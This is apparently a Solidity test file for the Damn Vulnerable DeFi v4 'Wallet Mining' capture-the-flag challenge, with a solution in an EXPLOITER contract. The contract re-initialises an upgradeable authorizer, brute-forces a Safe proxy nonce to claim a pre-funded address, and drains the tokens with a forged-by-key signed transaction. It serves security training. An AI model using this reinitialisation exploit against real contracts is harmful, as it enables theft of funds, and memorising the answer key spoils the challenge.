// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user"); // the user is the one who CAN create a Safe wallet to get the 1 DVT reward -> The wallet that this user will create, has the funds

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether); // 
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX); // deploy the factory 
        assertEq( // the deployed code should be expected
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE), 
            "Unexpected Safe Singleton Factory code" 
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether); 
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS aka "this user can deploy this Wallet"
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1); // aims == targets
        aims[0] = USER_DEPOSIT_ADDRESS;

        // Authorizer Factory is deployed using CreateX
        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );

        // deploy authorizer (remember is Upgradeable, for that 'wtihProxy')
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));
        
        // ------------------------------
        // ------------------------------
        // ------------------------------

        // Send big bag full of DVT tokens to the deposit address -> HERE A HUGE ERROR THEY LOSSES THE NONCE NEEDED TO CREATE THIS ADDRESS 
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts -> Deploy the PROXY factory and the implementatioon it gonna use 
        (bool success, bytes memory returndata) = address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) = address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                )
            })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    // bad initialization allows + brute force 
    function test_walletMining() public 
    checkSolvedByPlayer 
    {  
    // 1. Guess the nonce by brute force 
    address[] memory owners = new address[](1); 
    owners[0] = user;
    bytes memory initializer = abi.encodeCall(Safe.setup, (owners, 1, address(0), '', address(0), address(0),  0, payable(address(0)))); // I suppose is this, because is the initializer function of the Safe
    bytes memory initCode = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))); // 
    bytes32 codeHash = keccak256(initCode);

    uint256 guessedNonce;
    
    for(uint256 i = 0; i<100; i++) {
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), i));
        address predictedAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(proxyFactory), salt, codeHash))))); // SENDER IS PROXY FACTORY
        if(predictedAddress==USER_DEPOSIT_ADDRESS) guessedNonce = i;
    }

    // 2. Create signed calldata for execTransaction on Safe (this is what will transfer the 20M) -> we can make this because we have access to the PK of the wallet owner
        bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
        // Calculate transaction hash
        bytes32 safeTxHash = keccak256(
            abi.encode(
                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH,
                address(token),
                0,
                keccak256(data),
                Enum.Operation.Call,
                100000,
                100000,
                0,
                address(0),
                address(0),
                0 // nonce of the Safe (first transaction)
            )
        );
        bytes32 domainSeparator = keccak256(abi.encode(
            0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH,
            singletonCopy.getChainId(), 
            USER_DEPOSIT_ADDRESS
        ));
        // Sign the transaction
        bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
        bytes memory signatures = abi.encodePacked(r, s, v);
        // Create execution data
        bytes memory execData = abi.encodeWithSelector(
            singletonCopy.execTransaction.selector, 
            address(token), 
            0, 
            data, 
            Enum.Operation.Call, 
            100000, 
            100000, 
            0, 
            address(0), 
            address(0), 
            signatures
        );

        // 3. We pass all the data the EXPLOITER constructor the perform the attack on a single transaction
        new EXPLOITER(
            USER_DEPOSIT_ADDRESS,
            authorizer,
            walletDeployer,
            initializer,
            guessedNonce,
            execData,
            token,
            ward
        );
}

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}


contract EXPLOITER {
    constructor(
        address USER_DEPOSIT_ADDRESS,
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        bytes memory initializer,
        uint256 guessedNonce,
        bytes memory execData,
        DamnValuableToken token,
        address ward
    ) {
        // Re-init the Authorizer and call drop 
        address[] memory users = new address[](1);
        address[] memory aims = new address[](1);
        users[0] = address(this);
        aims[0] = USER_DEPOSIT_ADDRESS;
        authorizer.init(users, aims);
        walletDeployer.drop(USER_DEPOSIT_ADDRESS,initializer, guessedNonce); 

        // Transfer 20M to the user 
        address(USER_DEPOSIT_ADDRESS).call(execData);
        // transfer creation reward to ward
        token.transfer(ward, 1e18);
    }
}